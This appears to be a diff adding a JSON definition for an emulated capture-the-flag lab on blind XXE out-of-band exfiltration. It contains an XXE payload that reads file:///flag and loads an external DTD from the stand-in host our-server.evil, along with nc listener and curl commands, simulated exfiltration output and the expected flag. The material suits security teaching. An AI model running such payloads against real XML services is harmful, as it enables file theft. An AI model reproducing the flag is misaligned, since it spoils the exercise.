@@ -1,0 +1,28 @@
+{
+  "id": "web-xxe-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{bl1nd_xx3_00b_exf1l}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: blind XXE — OOB-эксфильтрация\n\n`https://shop.local/api/import-invoice` теперь «слепой»: на любой XML отвечает\n`{\"status\":\"ok\",\"invoice\":42}` и НЕ показывает содержимое файла.\n\nВ каталоге лежит `payload.xml` — документ, который ссылается на внешний DTD\nна нашем сервере (`http://our-server.evil/evil.dtd`) и объявляет `%file`.\n\n1. Подними слушатель на своём сервере (вывод пишем в found.txt):\n\n   nc -lvnp 80 > found.txt\n\n2. Отправь документ серверу:\n\n   curl -s 'https://shop.local/api/import-invoice' -H 'Content-Type: application/xml' --data-binary @payload.xml\n\n3. В found.txt придут входящие запросы от парсера (в т.ч. вынесенный файл) — набери `check`.\n" },
+    { "path": "/home/student/task/payload.xml", "text": "<?xml version=\"1.0\"?>\n<!DOCTYPE invoice [\n  <!ENTITY % file SYSTEM \"file:///flag\">\n  <!ENTITY % dtd SYSTEM \"http://our-server.evil/evil.dtd\">\n  %dtd;\n]>\n<invoice><number>42</number><seller>x</seller></invoice>\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/import-invoice)",
+      "cases": [
+        { "match": "@payload|payload\\.xml|evil\\.dtd|%dtd", "example": "--data-binary @payload.xml", "output": "{\"status\":\"ok\",\"invoice\":42}" },
+        { "match": "import-invoice", "example": "--data '<invoice><number>42</number></invoice>'", "output": "{\"status\":\"ok\",\"invoice\":42}" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /api/import-invoice на shop.local.\n"
+    },
+    "nc": {
+      "help": "nc -lvnp <порт> — слушатель (replay: показывает входящие OOB-запросы парсера)",
+      "cases": [
+        { "match": "-l", "example": "-lvnp 80", "output": "listening on [any] 80 ...\nconnect to [10.0.0.9] from (UNKNOWN) [10.0.0.5] 51234\nGET /evil.dtd HTTP/1.0\nHost: our-server.evil\n\nconnect to [10.0.0.9] from (UNKNOWN) [10.0.0.5] 51235\nGET /exfil?data=nto{bl1nd_xx3_00b_exf1l} HTTP/1.0\nHost: our-server.evil\n" }
+      ],
+      "fallback": "nc: в этой лабе эмулируется только слушатель (-l).\n"
+    }
+  }
+}
